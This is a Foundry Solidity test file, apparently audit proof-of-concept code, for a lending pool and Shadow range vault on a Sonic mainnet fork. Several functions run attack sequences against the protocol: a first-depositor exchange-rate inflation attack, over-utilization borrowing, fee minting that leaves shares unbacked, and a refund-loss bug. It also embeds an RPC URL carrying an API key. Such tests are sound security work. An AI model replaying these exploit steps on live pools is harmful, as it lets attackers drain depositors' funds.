// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/AddressRegistry.sol";
import "contracts/mock/MockWETH9.sol";
import "contracts/shadow/ShadowRangeVault.sol";
import "contracts/shadow/ShadowRangePositionImpl.sol";
import "contracts/shadow/ShadowPositionValueCalculator.sol";
import "contracts/VaultRegistry.sol"; //vault factory

import "contracts/lendingpool/LendingPool.sol";
import {PrimaryPriceOracle} from "contracts/PrimaryPriceOracle.sol";
//IShadowSwapRouter == uniswapRouterV3

contract DebugTest is Test {
    MockWETH9 public wS = MockWETH9(payable(0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38));
    ERC20 public wETH = ERC20(0x50c42dEAcD8Fc9773493ED674b675bE577f2634b); //MintedERC20 have burn function
    ERC20 public USDC = ERC20(0x29219dd400f2Bf60E5a23d13Be72B486D4038894); //e6
    ERC20 public USDT = ERC20(0x6047828dc181963ba44974801FF68e538dA5eaF9);

    AddressRegistry public addressRegistry;
    VaultRegistry public vaultRegistry;
    LendingPool public lendingPool;
    PrimaryPriceOracle public primaryPriceOracle;
    //IShadowSwapRouter public shadowSwapRouter;
    ShadowPositionValueCalculator public shadowPositionValueCalculator;

    ShadowRangeVault public vault1; // wS-USDC.e-50
    ShadowRangeVault public vault2; // wS-WETH-50
    ShadowRangeVault public vault3; // USDC.e-USDT-1

    address liquidator = makeAddr("liquidator");

    address treasuryAddress = 0x57C41F44aA5b0793a3fE0195F6c879892494109F;
    address positionManagerV3 = 0x12E66C8F215DdD5d48d150c8f46aD0c6fB0F4406;
    address swapRouter = 0x5543c6176FEb9B4b179078205d7C29EEa2e2d695;
    address swapxPositionManager = 0xd82Fe82244ad01AaD671576202F9b46b76fAdFE2;
    address swapXswapRouter = 0x037c162092881A249DC347D40Eb84438e3457c02;

    function setUp() public {
        vm.createSelectFork(
            "https://rpc.ankr.com/sonic_mainnet/95e6b7b3769824dfa420ef460b5fd940bff206ca48caea572c3a9198f245bbb5",
            21529000
        ); // Sonic/Phantom Mainnet Fork Block 21529000

        address admin = address(this);

        addressRegistry = new AddressRegistry(address(wS));
        addressRegistry.setAddress(1, address(wS)); // Set WETH9 address in AddressRegistry

        vaultRegistry = new VaultRegistry(address(addressRegistry));
        addressRegistry.setAddress(10, address(vaultRegistry)); // Set VaultRegistry address in AddressRegistry
        lendingPool = new LendingPool();
        lendingPool.initialize(address(addressRegistry), address(wS));
        addressRegistry.setAddress(9, address(lendingPool)); // Set LendingPool address in AddressRegistry

        primaryPriceOracle = new PrimaryPriceOracle();
        address[] memory initialTokens = new address[](4);
        bytes32[] memory priceIds = new bytes32[](4);
        initialTokens[0] = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38; // wS
        initialTokens[1] = 0x50c42dEAcD8Fc9773493ED674b675bE577f2634b; // wETH
        initialTokens[2] = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894; // USDC.e
        initialTokens[3] = 0x6047828dc181963ba44974801FF68e538dA5eaF9; // USDT
        priceIds[0] = 0xf490b178d0c85683b7a0f2388b40af2e6f7c90cbe0f96b31f315f08d0e5a2d6d; // wS price id
        priceIds[1] = 0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace; // wETH price id
        priceIds[2] = 0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a; // USDC.e price id
        priceIds[3] = 0x2b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b; // USDT price id

        primaryPriceOracle.initialize(
            0x2880aB155794e7179c9eE2e38200202908C17B43, // Pyth address on Phantom
            admin, // OracleManager address
            initialTokens, // Initial tokens (empty for now)
            priceIds // Initial price ids (empty for now)
        );
        addressRegistry.setAddress(100, address(primaryPriceOracle)); // Set PrimaryPriceOracle address in AddressRegistry

        addressRegistry.setAddress(11, address(treasuryAddress)); // Set Treasury address in AddressRegistry
        addressRegistry.setAddress(12, address(treasuryAddress)); // Set Performance Fee Recipient address in AddressRegistry
        addressRegistry.setAddress(13, address(treasuryAddress)); // Set Liquidation Fee Recipient address in AddressRegistry
        addressRegistry.setAddress(300, address(swapRouter)); // Set ShadowSwapRouter address in AddressRegistry
        addressRegistry.setAddress(301, address(positionManagerV3)); // Set ShadowNonFungiblePositionManager address in AddressRegistry
        shadowPositionValueCalculator = new ShadowPositionValueCalculator();
        addressRegistry.setAddress(302, address(shadowPositionValueCalculator)); // Set ShadowPositionValueCalculator address in AddressRegistry

        //Lending Pool config
        lendingPool.initReserve(0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38); // wS
        lendingPool.initReserve(0x50c42dEAcD8Fc9773493ED674b675bE577f2634b); // wETH
        lendingPool.initReserve(0x29219dd400f2Bf60E5a23d13Be72B486D4038894); // USDC.e
        lendingPool.initReserve(0x6047828dc181963ba44974801FF68e538dA5eaF9); // USDT
        //create vaults
        vault1 = new ShadowRangeVault();
        vault1.initialize(
            address(addressRegistry),
            address(vaultRegistry),
            0x324963c267C354c7660Ce8CA3F5f167E05649970, //Pool: wS/USDC.e , from Gauge 0xe879d0e44e6873cf4ab71686055a4f6817685f02
            address(new ShadowRangePositionImpl())
        );
        vault1.setLiquidationFeeParams(500, 5000);
        vault1.setOpenLiquidationEnabled(true);
        vault1.setPerformanceFee(1500);
        vault1.setMinPositionSize(1 * 10 ** 8); // 1 USDC.e
        vault1.setShadowGauge(0xe879d0E44e6873cf4ab71686055a4f6817685f02);
        vault1.setReserveIds(1, 3); // wS, USDC

        uint256 vaultId1 = vaultRegistry.newVault(address(vault1));
        lendingPool.enableVaultToBorrow(vaultId1); //vaultId 1
        lendingPool.setCreditsOfVault(vaultId1, 1, type(uint256).max); // wS
        lendingPool.setCreditsOfVault(vaultId1, 3, type(uint256).max); // USDC.e

        skip(30); // skip 30 seconds to avoid block.timestamp = 0
    }

    function _testOverUtilizationAttack() public {
        // oracle should return 4 token prices. Pyth always return e8 price in USD$
        console.log("wS price: %e", primaryPriceOracle.getTokenPrice(address(wS)));
        console.log("wETH price: %e", primaryPriceOracle.getTokenPrice(address(wETH)));
        console.log("USDC.e price: %e", primaryPriceOracle.getTokenPrice(address(USDC)));
        console.log("USDT price: %e", primaryPriceOracle.getTokenPrice(address(USDT)));

        address user = makeAddr("User");
        vm.startPrank(user);
        deal(address(wS), user, 1000 ether);
        deal(address(USDC), user, 2000e6);
        wS.approve(address(lendingPool), type(uint256).max);
        USDC.approve(address(lendingPool), type(uint256).max);
        uint256 tokenOut1 = lendingPool.deposit(1, 1000e18, user, 0);
        uint256 tokenOut2 = lendingPool.deposit(3, 2000e6, user, 0);
        console.log("-User deposit wSonic to lendingPool: %e", tokenOut1);
        console.log("-User deposit USDC.e to lendingPool: %e", tokenOut2);
        debugReserve(1);
        debugReserve(3);

        // oracle should return 4 token prices. Pyth always return e8 price in USD$
        console.log("wS price: %e", primaryPriceOracle.getTokenPrice(address(wS)));
        console.log("wETH price: %e", primaryPriceOracle.getTokenPrice(address(wETH)));
        console.log("USDC.e price: %e", primaryPriceOracle.getTokenPrice(address(USDC)));
        console.log("USDT price: %e", primaryPriceOracle.getTokenPrice(address(USDT)));

        //Lending Pool now available to borrowing
        //Exploiter borrow everything with lots of principal/collateral
        address exploiter = makeAddr("Exploiter");
        vm.startPrank(exploiter);
        deal(address(USDC), exploiter, 10000e6);
        USDC.approve(address(vault1), type(uint256).max);
        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
            amount0Principal: 0, // Amount of Sonic sent
            amount1Principal: 10000e6, // Amount of USDC.e sent
            amount0Borrow: 1000 ether,
            amount1Borrow: 2000e6, //debt 2478$
            amount0SwapNeededForPosition: 0,
            amount1SwapNeededForPosition: 0,
            amount0Desired: 10000 ether, // Amount of Sonic desired
            amount1Desired: 0, // Amount of USDC.e desired
            deadline: block.timestamp + 60 minutes,
            tickLower: -50000,
            tickUpper: 50000,
            ul: -50000,
            ll: 50000
        });
        //log ws and USDC balance of exploiter
        console.log("Exploiter USDC balance: %e", USDC.balanceOf(exploiter));
        console.log("Exploiter wSonic balance: %e", wS.balanceOf(exploiter));

        console.log("-Open Position");
        vault1.openPosition(params);

        //log ws and USDC balance of exploiter
        console.log("Exploiter USDC balance: %e", USDC.balanceOf(exploiter));
        console.log("Exploiter wSonic balance: %e", wS.balanceOf(exploiter));

        vm.startPrank(user);
        // utilization rate should be 100% now
        debugReserve(1);
        console.log("-wait a few hours and refresh interest rate");
        deal(address(wS), lendingPool.getETokenAddress(1), 1000e18);
        skip(3 days); // skip 4 hours
        //donation

        //refresh interest rate
        // lendingPool.deposit(3, 0, user, 0);
        debugReserve(1);
        //redeem half
        ERC20 eToken1 = ERC20(lendingPool.getETokenAddress(1));
        eToken1.approve(address(lendingPool), type(uint256).max);
        console.log("-Redeem half of eToken1 %e", eToken1.balanceOf(user));
        //redeem 50% of original. since we deposit double amount of liquidity
        uint256 redeemAmount = 1000e18 * 1e18 / lendingPool.exchangeRateOfReserve(1);
        console.log("-Redeem amount: %e", redeemAmount);
        uint256 redeemedTokens = lendingPool.redeem(1, redeemAmount, user, false);
        console.log("-User redeemed tokens: %e", redeemedTokens);
        // utilization rate should be >100%
        skip(6 days);
        debugReserve(1);
    }

    function _testUSDCfee() public {
        address user = makeAddr("User");
        vm.startPrank(user);
        deal(address(wS), user, 1000 ether);
        deal(address(USDC), user, 2000e6);
        wS.approve(address(lendingPool), type(uint256).max);
        USDC.approve(address(lendingPool), type(uint256).max);
        uint256 tokenOut1 = lendingPool.deposit(1, 1000e18, user, 0);
        uint256 tokenOut2 = lendingPool.deposit(3, 2000e6, user, 0);
        console.log("-User deposit wSonic to lendingPool: %e", tokenOut1);
        console.log("-User deposit USDC.e to lendingPool: %e", tokenOut2);
        debugReserve(1);
        debugReserve(3);

        // borrow everything
        deal(address(USDC), user, 10000e6);
        USDC.approve(address(vault1), type(uint256).max);
        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
            amount0Principal: 0, // Amount of Sonic sent
            amount1Principal: 10000e6, // Amount of USDC.e sent
            amount0Borrow: 0,
            amount1Borrow: 500e6, //debt 500$
            amount0SwapNeededForPosition: 0,
            amount1SwapNeededForPosition: 0,
            amount0Desired: 10000 ether, // Amount of Sonic desired
            amount1Desired: 0, // Amount of USDC.e desired
            deadline: block.timestamp + 60 minutes,
            tickLower: -50000,
            tickUpper: 50000,
            ul: -50000,
            ll: 50000
        });
        console.log("-Open Position");
        vault1.openPosition(params);

        // utilization rate should be 100% now
        debugReserve(3);
        ERC20 eToken3 = ERC20(lendingPool.getETokenAddress(3));
        console.log("Before Treasury eToken balance: %e", eToken3.balanceOf(treasuryAddress));

        skip(10);
        //refresh interest rate
        lendingPool.deposit(3, 0, user, 0);
        console.log("After Treasury eToken balance: %e", eToken3.balanceOf(treasuryAddress));
        debugReserve(3);
    }

    function _testReserveCreditIsInflated() public {
        //admin config
        lendingPool.setCreditsOfVault(1, 1, type(uint256).max); // wS
        lendingPool.setCreditsOfVault(1, 3, type(uint256).max); // USDC.e

        // Test case for minting fee devaluing shares
        // User deposits and borrowing USDC.e and wSonic
        address user = makeAddr("User");
        vm.startPrank(user);
        deal(address(wS), user, 20000 ether);
        deal(address(USDC), user, 20000e6);
        wS.approve(address(lendingPool), type(uint256).max);
        USDC.approve(address(lendingPool), type(uint256).max);
        uint256 tokenOut1 = lendingPool.deposit(1, 1000e18, user, 0);
        uint256 tokenOut2 = lendingPool.deposit(3, 2000e6, user, 0);
        debugReserve(1);
        debugReserve(3);

        console.log("-User deposit wSonic to lendingPool: %e", tokenOut1);
        console.log("-User deposit USDC.e to lendingPool: %e", tokenOut2);
        // User borrows USDC.e and wSonic

        wS.approve(address(vault1), type(uint256).max);
        USDC.approve(address(vault1), type(uint256).max);
        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
            amount0Principal: 0, // Amount of Sonic sent
            amount1Principal: 10000e6, // Amount of USDC.e sent
            amount0Borrow: 1000 ether,
            amount1Borrow: 2000e6, //debt 2478$
            amount0SwapNeededForPosition: 0,
            amount1SwapNeededForPosition: 0,
            amount0Desired: 10000 ether, // Amount of Sonic desired
            amount1Desired: 0, // Amount of USDC.e desired
            deadline: block.timestamp + 60 minutes,
            tickLower: -50000,
            tickUpper: 50000,
            ul: -50000,
            ll: 50000
        });
        console.log("-Open Position");
        uint256 positionId = vault1.nextPositionID();
        vault1.openPosition(params);

        // utilization rate should be 100% now
        debugReserve(1);
        debugReserve(3);

        //wait few days
        console.log("-wait a few days and refresh interest rate");
        skip(3 days);
        debugReserve(1);
        debugReserve(3);
        //repay
        (uint256 amount0Debt, uint256 amount1Debt) = vault1.getPositionDebt(positionId);
        console.log("-Debt amount0: %e", amount0Debt);
        console.log("-Debt amount1: %e", amount1Debt);
        vault1.repayExact(positionId, type(uint256).max, type(uint256).max);
        ERC20 eToken1 = ERC20(lendingPool.getETokenAddress(1));
        ERC20 eToken3 = ERC20(lendingPool.getETokenAddress(3));
        console.log("-User eToken balance: %e", eToken1.balanceOf(user));
        console.log("-User eToken balance: %e", eToken3.balanceOf(user));
        console.log("-Treasury eToken balance: %e", eToken1.balanceOf(treasuryAddress));
        console.log("-Treasury eToken balance: %e", eToken3.balanceOf(treasuryAddress));

        debugReserve(1);
        debugReserve(3);
    }

    function _testMintingFeeDevalueShare() public {
        //admin config. Fix vault credit
        lendingPool.setCreditsOfVault(1, 1, type(uint256).max / 2); // wS
        lendingPool.setCreditsOfVault(1, 3, type(uint256).max / 2); // USDC.e
        lendingPool.setReserveFeeRate(1,10000);// fee 50% from interest
        lendingPool.setReserveFeeRate(3,10000);// fee 50% from interest

        // Test case for minting fee devaluing shares
        // User deposits and borrowing USDC.e and wSonic
        address user = makeAddr("User");
        vm.startPrank(user);
        deal(address(wS), user, 10000 ether);
        deal(address(USDC), user, 20000e6);
        wS.approve(address(lendingPool), type(uint256).max);
        USDC.approve(address(lendingPool), type(uint256).max);
        uint256 tokenOut1 = lendingPool.deposit(1, 1000e18, user, 0);
        uint256 tokenOut2 = lendingPool.deposit(3, 2000e6, user, 0);
        debugReserve(1);
        debugReserve(3);

        console.log("-User deposit wSonic to lendingPool: %e", tokenOut1);
        console.log("-User deposit USDC.e to lendingPool: %e", tokenOut2);
        // User borrows USDC.e and wSonic

        wS.approve(address(vault1), type(uint256).max);
        USDC.approve(address(vault1), type(uint256).max);
        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
            amount0Principal: 0, // Amount of Sonic sent
            amount1Principal: 10000e6, // Amount of USDC.e sent
            amount0Borrow: 1000 ether,
            amount1Borrow: 2000e6, //debt 2478$
            amount0SwapNeededForPosition: 0,
            amount1SwapNeededForPosition: 0,
            amount0Desired: 10000 ether, // Amount of Sonic desired
            amount1Desired: 0, // Amount of USDC.e desired
            deadline: block.timestamp + 60 minutes,
            tickLower: -50000,
            tickUpper: 50000,
            ul: -50000,
            ll: 50000
        });
        console.log("-Open Position");
        uint256 positionId = vault1.nextPositionID();
        vault1.openPosition(params);

        // utilization rate should be 100% now
        debugReserve(1);
        debugReserve(3);

        //wait few days
        console.log("-wait a few days and refresh interest rate");
        skip(365 days);
        debugReserve(1);
        debugReserve(3);
        //repay
        (uint256 amount0Debt, uint256 amount1Debt) = vault1.getPositionDebt(positionId);
        console.log("-Debt amount0: %e", amount0Debt);
        console.log("-Debt amount1: %e", amount1Debt);
        ERC20 eToken1 = ERC20(lendingPool.getETokenAddress(1));
        ERC20 eToken3 = ERC20(lendingPool.getETokenAddress(3));
        // eToken1.approve(address(vault1), type(uint256).max);
        // eToken3.approve(address(vault1), type(uint256).max);
        vault1.repayExact(positionId, amount0Debt, amount1Debt);
        
        console.log("-User eToken balance: %e", eToken1.balanceOf(user));
        console.log("-User eToken balance: %e", eToken3.balanceOf(user));
        console.log("-Treasury eToken balance: %e", eToken1.balanceOf(treasuryAddress));
        console.log("-Treasury eToken balance: %e", eToken3.balanceOf(treasuryAddress));

        debugReserve(1);
        debugReserve(3);

        //No more borrowing. Treasury and user can now safely withdraw everything.
        //Issue: total eToken * exchangeRate > total liquidity. Treasury mint token without reserve backing
        //Not enough liquidity despite all debt have been repay for everyone to withdraw.
        
        vm.startPrank(treasuryAddress);
        eToken3.approve(address(lendingPool), type(uint256).max);
        lendingPool.redeem(3, type(uint256).max, treasuryAddress, false);
        console.log("--- Treasury Receive USDC: %e", USDC.balanceOf(treasuryAddress));
        debugReserve(3);

        vm.startPrank(user);
        eToken3.approve(address(lendingPool), type(uint256).max);
        lendingPool.redeem(3, type(uint256).max, address(0x123), false);

        console.log("--- User Receive USDC: %e", USDC.balanceOf(address(0x123)));
        debugReserve(3);
    }

    function _testDebugInflationAttack_H01() public {
        console.log("Debugging test started");
        address exploiter = makeAddr("Exploiter");
        vm.startPrank(exploiter);
        deal(address(wS), exploiter, 1000 ether);
        deal(address(USDC), exploiter, 2000e6);
        wS.approve(address(lendingPool), type(uint256).max);
        USDC.approve(address(lendingPool), type(uint256).max);

        // oracle should return 4 token prices. Pyth always return e8 price in USD$
        console.log("wS price: %e", primaryPriceOracle.getTokenPrice(address(wS)));
        console.log("wETH price: %e", primaryPriceOracle.getTokenPrice(address(wETH)));
        console.log("USDC.e price: %e", primaryPriceOracle.getTokenPrice(address(USDC)));
        console.log("USDT price: %e", primaryPriceOracle.getTokenPrice(address(USDT)));

        debugReserve(1);
        //deposit wS and USDC.e to vault1
        uint256 tokenOut = lendingPool.deposit(1, 1, exploiter, 0); // wS
        console.log("-deposit and get eToken: %e", tokenOut);
        debugReserve(1);
        //inflate wS by increasing availableLiquidity
        wS.transfer(lendingPool.getETokenAddress(1), 999e18);
        debugReserve(1);
        console.log("-exchange rate inflated to really high value");

        address user = makeAddr("User");
        vm.startPrank(user);
        deal(address(wS), user, 500 ether);
        wS.approve(address(lendingPool), type(uint256).max);
        uint256 tokenOut2 = lendingPool.deposit(1, 500e18, user, 0);
        console.log("-second user deposit tokenOut: %e", tokenOut2);
        debugReserve(1);

        vm.startPrank(exploiter);
        ERC20(lendingPool.getETokenAddress(1)).approve(address(lendingPool), type(uint256).max);
        uint256 redeemedTokens = lendingPool.redeem(1, type(uint256).max, exploiter, false);
        console.log("-exploiter redeemed tokens: %e", redeemedTokens); // 1,300e18 token
        debugReserve(1);
    }

    function testOpenPositionSendTooMuchETH_H02() public {
        // Test case for opening a position with too much ETH sent. Over twice amount of principle
        address exploiter = makeAddr("Exploiter");
        vm.startPrank(exploiter);
        uint256 totalSonic = 300 ether; // Amount of Sonic sent
        deal(exploiter, totalSonic);

        // Open position with too much ETH sent
        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
            amount0Principal: 100 ether, // Amount of Sonic sent
            amount1Principal: 0, // Amount of USDC.e sent
            amount0Borrow: 0,
            amount1Borrow: 0,
            amount0SwapNeededForPosition: 0,
            amount1SwapNeededForPosition: 0,
            amount0Desired: 100 ether, // Amount of Sonic desired
            amount1Desired: 0, // Amount of USDC.e desired
            deadline: block.timestamp + 60 minutes,
            tickLower: -50000,
            tickUpper: 50000,
            ul: -50000,
            ll: 50000
        });

        console.log("Before Vault Sonic balance: %e", address(vault1).balance);
        console.log("Before user Sonic balance: %e", address(exploiter).balance);

        console.log("Open Sonic Position with: %e SONIC", totalSonic);
        vault1.openPosition{value: totalSonic}(params);

        // It is expected to get refund 200 wS back
        // instead we get get only 100 Sonic, 100 wSonic is stucked in the vault
        console.log("wS stuck on Vault: %e", wS.balanceOf(address(vault1)));
        console.log("After user Sonic balance: %e", address(exploiter).balance);

        uint256 refundAmount = 100 ether;
        assertEq(address(exploiter).balance, refundAmount, "Refund amount is not correct");
    }

    function _testStakeRewards() public {
        //CASE1: stake small deposit weth and USDC. does not affect rewards much. global index and its reward rate does not rounded down too much
        //CASE2: no stake and reward early. It still split rewards correctly
        //Case3: stake and set rewards with start time early. Nothing wrong
        //CASE4: bullshit attack withdraw 99.9999% pool to fast forward rewards mechanism.Speed is the same

        //admin set reward
        ERC20 rewardToken = new ERC20("REWARD", "REWARD"); // SHADOW token
        deal(address(rewardToken), address(this), 10_000e18);

        StakingRewards stakingPool = StakingRewards(lendingPool.getStakingAddress(3)); // USDC
        rewardToken.approve(address(stakingPool), type(uint256).max);

        //notify rewards
        stakingPool.setReward(address(rewardToken), block.timestamp, block.timestamp + 60 days, 10_000e18);
        console.log("Staking rewards test executed");

        address user = makeAddr("User");
        vm.startPrank(user);
        uint256 depositAndStakeAmount = 1.00001e6;
        deal(address(USDC), user, depositAndStakeAmount);
        USDC.approve(address(lendingPool), type(uint256).max);
        lendingPool.depositAndStake(3, depositAndStakeAmount, user, 0); // USDC

        uint256 userEarned = stakingPool.earned(user, address(rewardToken));
        console.log("User earned after staking: %e", userEarned);
        skip(1 days);
        console.log("User earned after skip: %e", stakingPool.earned(user, address(rewardToken)));
        console.log("RewardPerToken: %e", stakingPool.rewardPerToken(address(rewardToken)));
        (,, uint256 rewardRate, uint256 lastUpdateTime, uint256 rewardPerTokenStored) =
            stakingPool.rewardData(address(rewardToken));
        console.log("Reward Rate: %e", rewardRate);
        console.log("Last Update Time: %e", lastUpdateTime);
        console.log("Reward Per Token Stored: %e", rewardPerTokenStored);

        //withdraw USDC.e from lendingPool

        console.log("stakingPoolBalance: %e", stakingPool.balanceOf(user));
        ERC20(lendingPool.getETokenAddress(3)).approve(address(lendingPool), type(uint256).max);
        lendingPool.unStakeAndWithdraw(3, stakingPool.balanceOf(user) - 1, user, false); // USDC

        console.log("User earned after withdraw: %e", stakingPool.earned(user, address(rewardToken)));
        skip(1 days);
        console.log("User earned after skip: %e", stakingPool.earned(user, address(rewardToken)));
    }

    function debugReserve(uint256 reserveId) public view {
        console.log("----Reserve Status [%d]----", reserveId);
        // console.log("%s Underlying Token Address", lendingPool.getUnderlyingTokenAddress(reserveId));
        // console.log("%s eToken Address", lendingPool.getETokenAddress(reserveId));
        // console.log("%s Staking Address", lendingPool.getStakingAddress(reserveId));
        console.log("%e Total Liquidity", lendingPool.totalLiquidityOfReserve(reserveId));
        console.log("%e Total Borrows", lendingPool.totalBorrowsOfReserve(reserveId));
        console.log("%e Exchange Rate", lendingPool.exchangeRateOfReserve(reserveId));
        console.log("%e Utilization Rate", lendingPool.utilizationRateOfReserve(reserveId));
        console.log("%e Borrowing Rate", lendingPool.borrowingRateOfReserve(reserveId));
        // Additional reserve properties (like fee rate, booleans, update timestamp, borrowing index)
        // would need new getter functions in LendingPool.
        console.log("%e BorrowingIndex", lendingPool.latestBorrowingIndex(reserveId));
    }
}
